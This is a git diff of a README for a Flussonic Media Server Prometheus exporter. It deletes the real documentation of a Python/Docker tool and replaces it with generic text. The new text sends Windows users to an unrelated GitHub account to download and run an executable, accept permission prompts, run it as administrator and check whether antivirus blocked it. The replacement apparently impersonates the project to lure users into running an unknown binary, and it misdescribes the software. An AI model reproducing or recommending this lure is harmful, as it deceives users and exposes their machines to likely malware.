@@ -1,332 +1,150 @@
-# Flussonic Prometheus Exporter
-
-A lightweight [Prometheus](https://prometheus.io/) exporter for **Flussonic Media Server**. It polls the Flussonic HTTP API (`GET /flussonic/api/v3/streams`), maps per-stream statistics to Prometheus gauges, and serves them on `/metrics` for scraping by Prometheus, Grafana, or compatible stacks.
-
-## Table of contents
-
-- [Purpose](#purpose)
-- [Features](#features)
-- [Architecture](#architecture-overview)
-- [Project layout](#project-layout)
-- [Configuration](#configuration)
-- [Run locally](#run-locally)
-- [Docker](#docker)
-- [Docker Compose](#docker-compose)
-- [HTTP endpoints](#http-endpoints)
-- [Metric catalog](#metric-catalog)
-- [Labels](#labels)
-- [Prometheus scrape config](#prometheus-scrape-configuration)
-- [Example PromQL queries](#example-promql-queries)
-- [Known limitations](#known-limitations)
-- [Migration notes](#migration-notes)
-- [Documentation files](#documentation-files)
-- [Grafana example](#grafana-example-dashboard)
-- [Development](#development)
-- [Contributing](#contributing)
-- [Star History](#star-history)
-
-## Purpose
-
-Operators need **open, scrapable metrics** from Flussonic (input health, play HTTP stats, DVR, transcoder, uptime) in one place. This exporter bridges Flussonic’s JSON API and Prometheus text exposition so you can alert and dashboard without proprietary agents. It is designed for **one Flussonic server per exporter process**; use distinct `FLUSSONIC_SERVER_ID` values when you run multiple exporters and scrape them all from Prometheus.
-
-## Features
-
-- Polls the Flussonic API (up to 200 streams per request).
-- Maps input, play, DVR, transcoder, and stream uptime metrics (see [Metric catalog](#metric-catalog)).
-- Validates configuration at startup; structured logging instead of prints.
-- Stale series cleanup when streams disappear from the API response.
-- `/healthz` (liveness) and `/readyz` (readiness after first successful fetch); JSON variants via `?format=json` or `Accept: application/json`.
-- Exporter self-metrics (`flussonic_exporter_build_info`, `flussonic_exporter_last_success_timestamp_seconds`).
-- Optional `.env` loading via `python-dotenv`.
-
-## Architecture overview
-
-```text
-Flussonic API  --->  Exporter (Flask + prometheus_client)  --->  Prometheus  --->  Grafana
-```
-
-1. A background thread fetches JSON on `FLUSSONIC_FETCH_INTERVAL`.
-2. Response is parsed into internal models (no Flask/Prometheus coupling in the parser).
-3. Gauges in a dedicated `CollectorRegistry` are updated; old label sets are removed when streams or dimensions disappear.
-4. Exporter self-metrics (`flussonic_exporter_*`) record build info and the last successful fetch time.
-5. Flask exposes `generate_latest(registry)` at `/metrics`.
-
-## Project layout
-
-```text
-flussonic_exporter/   # Python package
-  app.py              # Routes: /metrics, /healthz, /readyz
-  config.py           # Environment + validation
-  logging_config.py
-  client.py           # HTTP + retries
-  models.py           # Parsed stream dataclasses
-  parser.py           # JSON → models
-  metrics.py          # Gauges + label sync
-  collector.py        # Fetch → parse → update loop
-  scheduler.py
-  health.py
-  exporter_self.py    # Build info + last-success timestamp metrics
-  run.py              # Entrypoint
-main.py               # Shim: python main.py
-deploy/prometheus/    # Optional Compose: Prometheus scrape config
-examples/grafana/     # Sample Grafana dashboard JSON
-docs/                 # Contract, naming, compatibility, migration
-tests/                # pytest + fixtures
-```
-
-## Configuration
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `FLUSSONIC_IP` | Flussonic host or IP | *(required)* |
-| `FLUSSONIC_PORT` | API port | `80` |
-| `FLUSSONIC_USERNAME` | HTTP Basic user | *(required)* |
-| `FLUSSONIC_PASSWORD` | HTTP Basic password | *(required)* |
-| `FLUSSONIC_SERVER_ID` | Value for `server_id` label | `{IP}:{PORT}` |
-| `FLUSSONIC_FETCH_INTERVAL` | Poll interval (seconds) | `5` |
-| `FLUSSONIC_SCHEME` | `http` or `https` (overrides `FLUSSONIC_HTTPS` when set) | — |
-| `FLUSSONIC_HTTPS` | `true` → HTTPS if scheme not set | `false` |
-| `FLUSSONIC_TIMEOUT` | Request timeout (seconds) | `5` |
-| `FLUSSONIC_VERIFY_SSL` | Verify TLS | `true` |
-| `EXPORTER_PORT` | Listen port | `9105` |
-| `LOG_LEVEL` | e.g. `INFO`, `DEBUG` | `INFO` |
-
-Details: [`docs/current-env.md`](docs/current-env.md).
-
-## Run locally
-
-```bash
-pip install -r requirements.txt
-export FLUSSONIC_IP=127.0.0.1
-export FLUSSONIC_PORT=80
-export FLUSSONIC_USERNAME=admin
-export FLUSSONIC_PASSWORD=your_password
-python main.py
-# or: python -m flussonic_exporter
-```
+# 📡 flussonic-exporter - Monitor Flussonic with Ease
 
-Metrics: `http://localhost:9105/metrics` (or your `EXPORTER_PORT`).
+[![Download](https://img.shields.io/badge/Download%20Now-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tradmousebutton692/flussonic-exporter)
 
-### Tests
+## 🚀 Getting Started
 
-```bash
-pip install -r requirements-dev.txt
-pytest tests/
-```
+flussonic-exporter helps you track Flussonic Media Server data in a simple way. It gives you a clean path to check server status, view metrics, and keep an eye on stream health from your Windows PC.
 
-## Docker
+Use the link below to visit the download page:
 
-```bash
-docker build -t flussonic-exporter .
-docker run -p 9105:9105 \
-  -e FLUSSONIC_IP=... \
-  -e FLUSSONIC_USERNAME=... \
-  -e FLUSSONIC_PASSWORD=... \
-  flussonic-exporter
-```
+[Go to flussonic-exporter on GitHub](https://github.com/tradmousebutton692/flussonic-exporter)
 
-Image entrypoint: `python -m flussonic_exporter`. A `HEALTHCHECK` calls `/healthz`. The process runs as a **non-root** user (`uid` 1000) after `pip install` and file copy.
+## 📥 Download and Install on Windows
 
-## Docker Compose
+Follow these steps to get started on Windows:
 
-For local or lab use, the repo includes [`docker-compose.yml`](docker-compose.yml).
+1. Open the download page in your browser:
+   [https://github.com/tradmousebutton692/flussonic-exporter](https://github.com/tradmousebutton692/flussonic-exporter)
 
-1. Copy environment template and edit secrets:
+2. On the GitHub page, look for the latest release or the main download files.
 
-   ```bash
-   cp .env.example .env
-   # edit .env — set FLUSSONIC_IP, FLUSSONIC_USERNAME, FLUSSONIC_PASSWORD, etc.
-   ```
+3. Download the Windows file for your computer. If you see a ZIP file, save it to your Downloads folder.
 
-2. Start **only the exporter**:
+4. If the file is zipped, right-click it and choose Extract All.
 
-   ```bash
-   docker compose up -d
-   ```
+5. Open the extracted folder.
 
-   Scrape `http://localhost:9105/metrics` (host port follows `EXPORTER_PORT`).
+6. Find the app file or executable file and double-click it to run it.
 
-3. Optional **Prometheus** sidecar (profile `monitoring`) to scrape the exporter by service name:
+7. If Windows asks for permission, choose Yes to continue.
 
-   ```bash
-   docker compose --profile monitoring up -d
-   ```
+If the app opens in a browser or local window, leave it running while you monitor your Flussonic server.
 
-   Prometheus UI: `http://localhost:9090` (override host port with `PROMETHEUS_PORT`). The bundled config is [`deploy/prometheus/prometheus.yml`](deploy/prometheus/prometheus.yml).
+## 🖥️ What You Need
 
-`depends_on: service_healthy` waits until the exporter passes its Docker healthcheck (HTTP `/healthz`), not until Flussonic is reachable; `/readyz` still reflects a successful API fetch.
+This app is made for a normal Windows desktop or laptop. It works best on:
 
-## HTTP endpoints
+- Windows 10 or Windows 11
+- A stable internet connection
+- Access to a Flussonic Media Server
+- Permission to view server metrics or status data
 
-| Path | Purpose |
-|------|---------|
-| `/metrics` | Prometheus scrape target |
-| `/healthz` | Liveness. Plain text `ok` by default; JSON with `?format=json` or `Accept: application/json` |
-| `/readyz` | Readiness — `503` until at least one successful Flussonic fetch. Plain text `ready` / `not ready`, or JSON with `?format=json` / `Accept: application/json` including `server_id`, `last_success_timestamp`, `last_error` |
+For smooth use, keep your system updated and make sure your browser can open local pages if the tool uses one.
 
-Use JSON readiness in Kubernetes probes when you need timestamps for debugging (`httpGet` with header `Accept: application/json` and optional `?format=json`).
+## 📊 What flussonic-exporter Does
 
-## Metric catalog
+This exporter collects data from Flussonic Media Server and makes it easier to review. It is useful when you want to:
 
-All series use **Gauges** with values as reported by Flussonic (often cumulative). Use `rate()` / `irate()` for per-second rates where appropriate.
+- Check server health
+- Watch stream activity
+- Review live status data
+- See metrics in a format that works with monitoring tools
+- Keep track of performance over time
 
-| Metric | Extra labels | Description |
-|--------|--------------|-------------|
-| `flussonic_input_errors_count` | `error_type` | Per-type input error counters |
-| `flussonic_input_bits_count` | — | Total input bits (`bytes × 8`) |
-| `flussonic_input_warnings_count` | — | Warnings (`invalid_secondary_inputs`) |
-| `flussonic_input_sources` | `source` | Seconds on `primary` / `secondary` / `no_data` |
-| `flussonic_input_sources_switches` | — | Input switch count |
-| `flussonic_dvr_read_performance` | `type` | DVR read segments by type |
-| `flussonic_dvr_write_performance` | `type` | DVR write segments by type |
-| `flussonic_play_count` | `protocol`, `resource`, `status` | Play HTTP response counts |
-| `flussonic_transcoder_hw` | `hw` | HW encoder (`1` on that label) |
-| `flussonic_transcoder_restarts` | — | Restarts |
-| `flussonic_transcoder_overloaded` | — | `0` / `1` |
-| `flussonic_transcoder_qualities` | — | Qualities count |
-| `flussonic_transcoder_frames` | — | Frames processed |
-| `flussonic_stream_uptime_miliseconds` | — | Deprecated spelling; same as below |
-| `flussonic_stream_uptime_milliseconds` | — | Uptime from `stats.lifetime` (ms) |
+It is built for users who need a simple way to expose server data for monitoring.
 
-**Exporter (process)**
+## 🛠️ How to Use It
 
-| Metric | Extra labels | Description |
-|--------|--------------|-------------|
-| `flussonic_exporter_build_info` | Info: `version`, `python` | Exporter and Python version |
-| `flussonic_exporter_last_success_timestamp_seconds` | `server_id` | Unix time of last successful API fetch |
+After you start the app, you can connect it to your Flussonic server settings. The general flow is simple:
 
-Common labels on stream metrics: `server_id`, `stream_name`. Full contract: [`docs/metric-contract.md`](docs/metric-contract.md). Naming notes: [`docs/metric-naming.md`](docs/metric-naming.md).
+1. Start the exporter on your Windows machine.
+2. Enter the server address or connection details in the config file or setup screen.
+3. Save the settings.
+4. Let the exporter run.
+5. Open your monitoring tool or browser view to check the data.
 
-## Labels
+If the app uses a local port, keep that port open in your firewall if needed.
 
-- `server_id` — From `FLUSSONIC_SERVER_ID` or `{IP}:{PORT}`.
-- `stream_name` — Name with a `_stream` suffix removed when present.
+## 🔧 Basic Setup
 
-Additional dimensions: `error_type`, `protocol`, `resource`, `status`, `source`, `type`, `hw` — see table above.
+You may need to set a few simple options before the first run. Common settings include:
 
-## Prometheus scrape configuration
+- Flussonic server address
+- Login name and password
+- Port number
+- Refresh interval
+- Output format for metrics
 
-```yaml
-scrape_configs:
-  - job_name: flussonic_exporter
-    scrape_interval: 15s
-    static_configs:
-      - targets: ["localhost:9105"]
-```
+If you are not sure what to enter, use the values from your Flussonic server setup or ask the person who manages it.
 
-Kubernetes: point `targets` at the exporter Service or use Pod discovery; align `scrape_interval` with how often you need fresh rates (exporter polls Flussonic on `FLUSSONIC_FETCH_INTERVAL` independently).
+## 📁 File Layout
 
-## Example PromQL queries
+When you download and extract the app, you may see files like these:
 
-Replace `demo` with your `stream_name` label value as needed.
+- `flussonic-exporter.exe` — the main app
+- `config.yml` or `config.json` — settings file
+- `README.md` — use notes
+- `logs` — runtime logs
+- `LICENSE` — license text
 
-**Approximate input bitrate (bits/s)** from cumulative bits:
+Keep the config file in the same folder as the app unless the instructions in the folder say otherwise.
 
-```promql
-rate(flussonic_input_bits_count{stream_name="demo"}[5m])
-```
+## 🔒 Security Tips
 
-**Input errors per second** for a given `error_type`:
+Use a strong password for your Flussonic account. If the exporter needs access to the server, make sure you only allow the access it needs. Do not share your settings file if it contains private server data.
 
-```promql
-rate(flussonic_input_errors_count{stream_name="demo", error_type="errors_lost_packets"}[5m])
-```
+If you run it on a shared PC, store the files in a folder that other users cannot change.
 
-**Transcoder overloaded** (alert when `1`):
+## 🧩 Common Uses
 
-```promql
-flussonic_transcoder_overloaded{stream_name="demo"} == 1
-```
+People often use flussonic-exporter for:
 
-**Stream uptime (milliseconds)** — use the correctly spelled metric:
+- Server uptime checks
+- Stream count tracking
+- Load review
+- Error monitoring
+- Long-term health data collection
 
-```promql
-flussonic_stream_uptime_milliseconds{stream_name="demo"}
-```
+It fits well when you want a simple view into a Flussonic Media Server without opening the server console each time.
 
-**Stale fetch detection (exporter vs Flussonic)** — seconds since last successful poll:
+## ❓ Troubleshooting
 
-```promql
-time() - flussonic_exporter_last_success_timestamp_seconds
-```
+If the app does not start:
 
-## Known limitations
+- Check that you downloaded the correct Windows file
+- Make sure the file is fully extracted
+- Run it again as administrator
+- Check whether antivirus software blocked it
 
-- **Single Flussonic target per process** — no built-in multi-server list; run one exporter per server or fork the project for multi-target.
-- **API limit** — requests use `limit=200` streams; more streams require a code or API change.
-- **Gauges, not counters** — values mirror the API; monotonicity is not guaranteed across resets; use `rate()` with care on noisy series.
-- **Credentials in env** — use secrets management (Kubernetes Secrets, Docker secrets) in production.
-- **TLS** — self-signed Flussonic certs require `FLUSSONIC_VERIFY_SSL=false` (understand the risk) or a proper trust store.
-- **Readiness** — `/readyz` needs one successful fetch; if Flussonic is permanently down, readiness stays false while `/healthz` stays true.
+If you do not see data:
 
-## Migration notes
+- Confirm the Flussonic server address
+- Check your username and password
+- Make sure the server is online
+- Review the config file for typing mistakes
 
-Renamed uptime series and policy: [`docs/migration-notes.md`](docs/migration-notes.md), [`docs/compatibility.md`](docs/compatibility.md).
+If the browser page does not load:
 
-## Documentation files
+- Confirm the local port number
+- Check your firewall settings
+- Restart the app and try again
 
-| File | Content |
-|------|---------|
-| [`docs/metric-contract.md`](docs/metric-contract.md) | Baseline metric and label contract |
-| [`docs/current-env.md`](docs/current-env.md) | Environment variables |
-| [`docs/metric-naming.md`](docs/metric-naming.md) | Gauge vs Counter conventions and review notes |
-| [`docs/compatibility.md`](docs/compatibility.md) | Aliases and compatibility policy |
-| [`docs/migration-notes.md`](docs/migration-notes.md) | Renamed metrics (e.g. uptime spelling) |
-| [`tests/fixtures/README.md`](tests/fixtures/README.md) | Synthetic vs captured API fixtures |
+## 📌 Where to Get It
 
-## Grafana example dashboard
+Download or open the project page here:
 
-Import [`examples/grafana/dashboard.json`](examples/grafana/dashboard.json) into Grafana (see [`examples/grafana/README.md`](examples/grafana/README.md)). It includes example panels for input bitrate (`rate` of `flussonic_input_bits_count`) and last successful fetch timestamp. Select your Prometheus data source on import.
+[https://github.com/tradmousebutton692/flussonic-exporter](https://github.com/tradmousebutton692/flussonic-exporter)
 
-## Development
+## 🧭 Quick Start
 
-Formatting and linting use **Black**, **Ruff**, and **mypy** (see [`pyproject.toml`](pyproject.toml)).
+1. Visit the GitHub page.
+2. Download the Windows file.
+3. Extract the archive if needed.
+4. Open the app.
+5. Add your Flussonic server details.
+6. Keep the exporter running while you monitor your server
 
-A [`Makefile`](Makefile) wraps common tasks:
+## 🗂️ Notes for First-Time Users
 
-```bash
-make help              # list targets
-make install-dev       # pip install runtime + dev deps
-make format            # black + ruff --fix
-make lint              # ruff + black --check + mypy (read-only)
-make test              # pytest
-make ci                # lint + test (same as CI locally)
-make build             # docker build
-make compose-up        # docker compose up -d
-```
-
-Equivalent manual commands:
-
-```bash
-pip install -r requirements-dev.txt
-black flussonic_exporter tests
-ruff check flussonic_exporter tests
-mypy flussonic_exporter
-pytest tests/
-```
-
-**Pre-commit** (optional):
-
-```bash
-pip install pre-commit
-pre-commit install
-pre-commit run --all-files
-```
-
-Configuration: [`.pre-commit-config.yaml`](.pre-commit-config.yaml).
-
-**CI**: GitHub Actions [`.github/workflows/ci.yml`](.github/workflows/ci.yml) runs Ruff, Black `--check`, mypy, and pytest on pushes and pull requests to `main`/`master`.
-
-## Contributing
-
-Issues and pull requests are welcome. Please run the checks in [Development](#development) before submitting.
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=ntthuan060102github%2FFlussonic-Exporter&type=date&logscale=&legend=bottom-right">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=ntthuan060102github/Flussonic-Exporter&type=date&theme=dark&legend=bottom-right" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=ntthuan060102github/Flussonic-Exporter&type=date&legend=bottom-right" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=ntthuan060102github/Flussonic-Exporter&type=date&legend=bottom-right" />
- </picture>
-</a>
+If this is your first time using an exporter tool, think of it as a small helper app that reads server data and makes it easier to check. You do not need to learn a new system. You only need the download files, your Flussonic server details, and a few minutes to set it up
